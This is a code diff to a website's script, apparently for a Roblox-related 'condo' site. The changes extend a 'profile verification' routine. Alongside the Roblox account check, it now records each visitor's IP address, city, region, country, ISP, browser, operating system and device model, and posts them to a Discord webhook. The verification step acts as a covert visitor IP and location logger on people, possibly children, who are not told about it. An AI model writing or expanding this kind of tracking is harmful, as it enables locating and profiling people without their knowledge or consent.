@@ -377,40 +377,98 @@
      ROBLOX PROFILE VERIFICATION SYSTEM
      ══════════════════════════════════════════════════════════ */
 
-  /* ── Send log to Discord webhook ───────────────────────── */
+  /* ── Parse User-Agent into readable browser / OS / device ─ */
+  function parseUA(ua) {
+    if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Desktop' };
+    var browser = 'Unknown', os = 'Unknown', device = '\uD83D\uDDA5\uFE0F Desktop';
+    var m;
+    // Browser
+    if (/Firefox\/([\d.]+)/.test(ua))       { browser = 'Firefox ' + ua.match(/Firefox\/([\d.]+)/)[1]; }
+    else if (/Edg\/([\d.]+)/.test(ua))      { browser = 'Edge ' + ua.match(/Edg\/([\d.]+)/)[1]; }
+    else if (/OPR\/([\d.]+)/.test(ua))      { browser = 'Opera ' + ua.match(/OPR\/([\d.]+)/)[1]; }
+    else if (/Chrome\/([\d.]+)/.test(ua))   { browser = 'Chrome ' + ua.match(/Chrome\/([\d.]+)/)[1]; }
+    else if (/Version\/([\d.]+).*Safari/.test(ua)) { browser = 'Safari ' + ua.match(/Version\/([\d.]+)/)[1]; }
+    else if (/Safari\//.test(ua))           { browser = 'Safari'; }
+    // OS / Device
+    if (/iPhone/.test(ua)) {
+      m = ua.match(/iPhone OS ([\d_]+)/);
+      os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : '');
+      device = '\uD83D\uDCF1 iPhone';
+    } else if (/iPad/.test(ua)) {
+      m = ua.match(/OS ([\d_]+)/);
+      os = 'iPadOS ' + (m ? m[1].replace(/_/g, '.') : '');
+      device = '\uD83D\uDCF1 iPad';
+    } else if (/Android/.test(ua)) {
+      m = ua.match(/Android ([\d.]+)/);
+      os = 'Android ' + (m ? m[1] : '');
+      var model = ua.match(/;\s*([^;)]+)\s*Build\//);
+      device = '\uD83D\uDCF1 ' + (model ? model[1].trim() : 'Android');
+    } else if (/Windows NT/.test(ua)) {
+      m = ua.match(/Windows NT ([\d.]+)/);
+      var winMap = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7', '6.0': 'Vista', '5.1': 'XP' };
+      os = 'Windows ' + (m ? (winMap[m[1]] || m[1]) : '');
+      device = '\uD83D\uDDA5\uFE0F Desktop';
+    } else if (/Mac OS X/.test(ua)) {
+      m = ua.match(/Mac OS X ([\d_]+)/);
+      os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
+      device = '\uD83D\uDDA5\uFE0F Mac';
+    } else if (/Linux/.test(ua)) {
+      os = 'Linux';
+      device = '\uD83D\uDDA5\uFE0F Desktop';
+    }
+    return { browser: browser, os: os, device: device };
+  }
+
+  /* ── Send log to Discord webhook (fallback / roproxy path) */
   function sendVerificationLog(data) {
     var statusEmoji = data.accountAgeOk ? '\u2705' : data.found ? '\uD83D\uDEAB' : '\u274C';
     var statusText = data.accountAgeOk ? 'Verified (80+ days)' : data.found ? 'Blocked (< 80 days)' : 'Not Found';
     var color = data.accountAgeOk ? 2278782 : data.found ? 16355294 : 15686104;
 
+    var ua = navigator.userAgent || '';
+    var parsed = parseUA(ua);
+
     var fields = [
       { name: 'Status', value: statusEmoji + ' **' + statusText + '**', inline: true },
       { name: 'Username', value: data.username || 'unknown', inline: true },
     ];
-    if (data.displayName) fields.push({ name: 'Display Name', value: data.displayName, inline: true });
-    if (data.userId) fields.push({ name: 'User ID', value: String(data.userId), inline: true });
+    if (data.displayName && data.displayName !== data.username) fields.push({ name: 'Display Name', value: data.displayName, inline: true });
+    if (data.userId) fields.push({ name: 'User ID', value: '[' + data.userId + '](https://www.roblox.com/users/' + data.userId + '/profile)', inline: true });
     if (data.daysOld !== undefined) fields.push({ name: 'Account Age', value: String(data.daysOld) + ' days', inline: true });
     if (data.createdFormatted) fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
-    if (data.hasVerifiedBadge !== undefined) fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes \u2705' : 'No \u274C', inline: true });
+    if (data.hasVerifiedBadge !== undefined) fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes \u2705' : 'No', inline: true });
 
+    // Separator
+    fields.push({ name: '\u200b', value: '\u200b', inline: false });
+
+    // Browser / device info (always available client-side)
+    fields.push({ name: '\uD83C\uDF10 Browser', value: parsed.browser, inline: true });
+    fields.push({ name: '\uD83D\uDCBB OS', value: parsed.os, inline: true });
+    fields.push({ name: '\uD83D\uDCF1 Device', value: parsed.device, inline: true });
+
+    // Geo + IP (async)
     fetch('https://ipapi.co/json/')
       .then(function (r) { return r.ok ? r.json() : null; })
       .then(function (ipData) {
         if (ipData && ipData.country_code) {
-          var flag = String.fromCodePoint.apply(null, ipData.country_code.split('').map(function (c) { return c.charCodeAt(0) + 127397; }));
-          fields.push({ name: 'IP Address', value: (flag + ' ' + ipData.ip + ' \u2014 ' + ipData.country_name).trim(), inline: true });
+          var flag = '';
+          try {
+            flag = String.fromCodePoint.apply(null, ipData.country_code.split('').map(function (c) { return c.charCodeAt(0) + 127397; }));
+          } catch (e) {}
+          var location = [flag, ipData.city, ipData.region, ipData.country_name].filter(Boolean).join(', ');
+          fields.push({ name: '\uD83D\uDCCD Location', value: location || 'Unknown', inline: true });
+          fields.push({ name: '\uD83C\uDF10 IP', value: '`' + ipData.ip + '`', inline: true });
+          if (ipData.org) fields.push({ name: '\uD83C\uDFE2 ISP', value: ipData.org.substring(0, 50), inline: true });
         } else {
-          fields.push({ name: 'IP Address', value: 'unknown', inline: true });
+          fields.push({ name: '\uD83C\uDF10 IP', value: 'unknown', inline: true });
         }
       })
-      .catch(function () { fields.push({ name: 'IP Address', value: 'unknown', inline: true }); })
+      .catch(function () { fields.push({ name: '\uD83C\uDF10 IP', value: 'unknown', inline: true }); })
       .then(function () {
-        fields.push({ name: 'Device', value: '`' + navigator.userAgent.substring(0, 100) + '`', inline: false });
-        fields.push({ name: 'Time', value: new Date().toISOString(), inline: true });
+        fields.push({ name: '\uD83D\uDD50 Time', value: new Date().toISOString(), inline: true });
 
         var embed = {
-          title: '\uD83D\uDD0D Profile Verification',
-          description: '**New visitor entered the site and attempted profile verification.**\nAll information captured in a single log.',
+          title: '\uD83D\uDD0D Profile Verification (Fallback)',
           color: color,
           fields: fields,
           footer: { text: 'Rblx New Condos \u2014 Verification Log' },
